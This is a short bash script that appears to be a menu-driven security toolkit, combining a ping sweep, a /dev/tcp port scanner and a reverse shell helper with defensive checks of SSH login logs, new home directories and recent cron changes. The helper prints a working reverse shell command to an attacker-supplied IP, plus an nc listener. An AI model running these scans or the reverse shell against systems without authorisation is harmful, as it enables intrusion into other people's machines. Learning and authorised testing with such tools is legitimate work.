#!/bin/bash


# Bash Toolkit

banner() {
  echo -e "\ Bash Toolkit"
}

menu() {
  echo -e "\n Select an option:"
  echo "1) Ping Sweep"
  echo "2) Port Scanner"
  echo "3) Reverse Shell"
  echo "4) Analyze SSH Login Attempts"
  echo "5) List Suspicious New Users"
  echo "6) Check for Recent Cron Modifications"
  echo "0) Exit"
  echo -n "Choice: "
}

# --- Ping Sweep ---
ping_sweep() {
  echo -n "Enter subnet (e.g., 192.168.1): "
  read subnet
  echo -e "\n🔍 Pinging hosts in $subnet.0/24 ..."
  for ip in {1..254}; do
    ping -c 1 -W 1 $subnet.$ip | grep "64 bytes" &>/dev/null && echo "$subnet.$ip is UP" &
  done
  wait
  echo "Sweep complete"
}

# --- Port Scanner ---
port_scanner() {
  echo -n "Enter target IP: "
  read target
  echo "Scanning ports 20–1024 on $target ..."
  for port in {20..1024}; do
    (echo > /dev/tcp/$target/$port) &>/dev/null && echo "Port $port is OPEN"
  done
}

# --- Reverse Shell ---
reverse_shell_helper() {
  echo -n "Enter attacker IP: "
  read attacker_ip
  echo -n "Enter attacker port: "
  read port

  echo -e "\n Bash Reverse Shell command:"
  echo "bash -i >& /dev/tcp/$attacker_ip/$port 0>&1"
  echo -e "\n On your listener machine, run:"
  echo "nc -lvnp $port"
}

# --- Analyze SSH Logins ---
analyze_ssh_logins() {
  echo -e "\n Failed SSH login attempts by IP:"
  grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr

  echo -e "\n Successful SSH login IPs:"
  grep "Accepted password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq
}

# --- Suspicious New Users ---
new_users_check() {
  echo -e "\n Home directories (created in last 7 days):"
  find /home -type d -ctime -7
}

# --- Cron Job Modifications ---
cron_mod_check() {
  echo -e "\n Recently modified cron jobs (last 2 days):"
  find /etc/cron* -type f -mtime -2
}

# === Main Execution Loop ===
banner
while true; do
  menu
  read choice
  case $choice in
    1) ping_sweep ;;
    2) port_scanner ;;
    3) reverse_shell_helper ;;
    4) analyze_ssh_logins ;;
    5) new_users_check ;;
    6) cron_mod_check ;;
    0) echo "Exiting"; exit ;;
    *) echo "Invalid" ;;
  esac
done